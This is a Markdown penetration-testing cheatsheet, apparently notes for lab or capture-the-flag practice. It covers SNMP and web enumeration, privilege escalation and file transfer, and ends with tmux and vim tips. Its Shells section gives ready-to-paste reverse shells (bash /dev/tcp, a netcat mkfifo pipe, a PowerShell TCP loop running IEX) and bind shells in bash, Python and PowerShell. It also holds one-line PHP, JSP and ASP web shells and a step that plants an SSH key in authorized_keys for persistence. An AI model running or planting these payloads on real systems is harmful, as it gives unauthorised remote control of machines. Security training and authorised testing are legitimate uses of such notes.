# Cheatsheet

## Table of Contents
- [Enumeration](#enumeration)
    - [Nmap](#nmap)
    - [SNMP](#snmp)
- [Web Enumeration](#web-enumeration)
    - [Banner Grabbing](#banner-grabbing)
    - [gobuster](#gobuster)
    - [whatweb](#whatweb)
- [Shells](#shells)
    - [Reverse Shells](#reverse-shells)
    - [Bind Shells](#bind-shells)
    - [Upgrading TTY](#upgrading-tty)
    - [Web Shells](#web-shells)
- [Privilege Escalation](#privilege-escalation)
    - [PrivEsc Checklists](#priveesc-checklists)
    - [Enumeration Scripts](#enumeration-scripts)
    - [Kernel Exploits](#kernel-exploits)
    - [Vunlnerable Software](#vulnerable-software)
    - [User Privileges](#user-privileges)
    - [Scheduled Tasks](#scheduled-tasks)
    - [Exposed Credentials](#exposed-credentials)
    - [SSH Keys](#ssh-keys)
- [Transferring Files](#transferring-files)
- [Other](#other)
    - [Network](#network)
    - [Tmux](#tmux)
    - [Vim](#vim)

## Enumeration

### Nmap

Find scripts for a service:  
`locate scripts/<service-name>`

Cross reference service versions with changelogs to find OS version (not necessarily correct)

### SNMP

Default community strings of `public` and `private` are often unchanged

SNMP version 1 and 2c controls access with plaintext community strings

We can dump useful information from process parameters like credentials, routing information,
services bound to additional interfaces, and the version of installed software

```bash
# OIDs will be displayed after executing snmpwalk
# -v: version of SNMP, 1.3.6.1.2.1.1.5.0: OID for string
snmpwalk -v 2c -c public 10.10.10.1 1.3.6.1.2.1.1.5.0

# bruteforce community string names with onesixtyone
onesixtyone -c dict.txt 10.10.10.1
```

## Web Enumeration

### Banner grabbing

```bash
# netcat
nc 10.10.0.1 22

# curl
curl -IL https://10.10.10.1
```

### gobuster

```bash
# directory enumeration
gobuster dir -u http://10.10.10.1/ -w /usr/share/dirb/wordlistts/common.txt

# DNS enumeration
gobuster dns -d google.com -w /usr/share/seclists/Discovery/DNS/namelist.txt
```

### whatweb

Extract the version of web servers, supporting frameworks, and applications

```bash
whatweb 10.10.10.1
```

### Certificates

View SSL/TLS certificates of HTTPS websites for information on the target organization

### Robots.txt

Navigate to /robots.txt to find potential targets

## Shells

### Reverse Shells

Bash

```bash
# tcp
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

# nc pipe
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

PowerShell

```powershell
# TCP client to IEX
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

### Bind Shells

Bash

```bash
# nc pipe
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Python

```python
# socket listener to subprocess
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")
```

PowerShell
```powershell
# socket listener to IEX
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Upgrading TTY

```bash
# python/stty method
python -c 'import pty; pty.spawn("/bin/bash")'

# background the netcat shell
^Z

# use stty to prevent input from being processed in our terminal
# Ctrl+c will not terminate the current process, arrow keys will move the cursor etc.
stty raw -echo

# foreground the netcat shell
fg

# open another terminal and determine settings for the nectcat shell
echo $TERM
stty size

# go back to the netcat shell and set the desired values
export TERM=xterm-256color
stty rows 51 columns 116
```

### Web Shells

PHP

```php
<?php system($_REQUEST["cmd"]); ?>
```

JSP (Java Server Pages)

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

ASP

```asp
<% eval request("cmd") %>
```

Common web server webroots

| Web Server | Default Webroot |
|------------|-----------------|
| Apache | /var/www/html/ |
| Nginx | /usr/local/nginx/html/ |
| IIS | C:\inetpub\wwwroot\ |
| XAMPP | C:|xampp\htdocs\ |

## Privilege Escalation

### PriveEsc Checklists

[HackTricks](https://book.hacktricks.xyz/)
- [Linux](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
- [Windows](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Enumeration Scripts

Linux
- [LinEnum](https://github.com/rebootuser/LinEnum.git)
- [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
- [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

Windows
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [JAWS](https://github.com/411Hall/JAWS)
- [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

### Kernel Exploits

Check public exploits for any old OS versions we encounter

### Vulnerable Software

Check installed software for vulnerabilities

Linux

```bash
dpkg -l
```

Windows

```powershell
Get-ChildItem "C:\Program Files"
Get-ChildItem "C:\Program Files (x86)"
```

### User Privileges

Linux - [GTFOBins](https://gtfobins.github.io/)

```bash
# list sudo privileges for the user
sudo -l

# run commmands as another user
sudo -u user /path/to/bin
```

Windows - [LOLBAS](https://lolbas-project.github.io/#)

### Scheduled Tasks

Linux

- Cron Jobs

```
/etc/crontab
/etc/cron.d
/var/spool/cron/crontabs/root
```

Windows

- Scheduled Tasks

```cmd
schtasks
schtasks /Query /FO list
schtasks /Query /FO table > table.txt
```

### Exposed Credentials

Check config files, logs, bash_history, PSReadLine

### SSH Keys

```bash
# generate a new ssh key as a compromised user
ssh-keygen -f key

# add the key to authorised_keys
cat key.pub >> ~/.ssh/authorized_keys

# connect to the target with the new key
ssh user@10.10.10.1 -i key
```

## Transferring Files

Wget and cURL

```bash
wget http://10.10.10.1:8080/linpeas.sh
curl http://10.10.10.1:8080/linpeas.sh -o /tmp/linpeas.sh
```

SCP

```bash
scp linpeas.sh user@10.10.10.1:/tmp/linpeas.sh
```

base64

```bash
# encode file on attackers machine
base64 shell -w 0

# copy and paste base64 string to the target
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

Validate files

```bash
# validate a transferred file's format
file shell

# validate file after encoding, run on attacker machine and target then compare
md5sum shell
```

## Other

### Network

Ports cheatsheets:
- https://www.stationx.net/common-ports-cheat-sheet/
- https://packetlife.net/media/library/23/common-ports.pdf
- https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/

View accessible networks (routing table):  
`netstat -rn`

Show IPv4 interfaces:  

```bash
# show all interfaces
ip -4 a

# show named interface
ip -4 a show eth0
```

### Tmux

Command prefix: `Ctrl + b`  
New window: prefix, `c`  
Split vertically: prefix, `Shift + %`  
Split horizontally: prefix, `Shift + "`  
Switch: prefix, `up/down/left/right arrow`  

### Vim

| Command | Description |
|---------|-------------|
| x | Cut char |
| dw | Cut word |
| dd | Cut line |
| yw | Copy word |
| yy | Copy line |
| p | Paste |
| :1 | Go to line 1 |